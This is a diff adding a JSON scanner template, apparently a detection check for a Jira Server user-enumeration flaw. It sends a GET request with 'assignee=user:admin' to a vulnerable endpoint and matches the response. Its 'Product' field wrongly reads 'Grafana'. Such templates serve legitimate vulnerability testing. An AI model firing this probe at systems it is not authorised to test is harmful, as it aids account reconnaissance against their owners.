@@ -1,0 +1,33 @@
+{
+    "Name": "Jira_信息泄露",
+    "Description": " 受影响的 Atlassian Jira 服务器和数据中心版本允许未经身份验证的用户通过 QueryComponentRendererValue!Default.jspa 端点中的信息披露漏洞枚举用户。受影响的版本为 8.5.13 之前的版本、8.13.5 之前的 8.6.0 版本以及 8.15.1 之前的 8.14.0 版本",
+    "Product": "Grafana",
+    "author": "chumeng",
+    "Request":[
+                {
+        "Method": "GET",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+        "Uri":"/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin",
+        "Port":"",
+        "Data":"",
+        "Follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+        "Check_Steps":"AND",
+        "Checks": [
+                {
+                "Operation": "contains", 
+                "Key":"",
+                "Value": "jspa?name=admin"
+                },
+                 {
+                "Operation": "code", 
+                "Key":"",
+                "Value": "200"  
+                 }
+        ]
+        },
+        "Next_decide":""
+                }
+]}
+
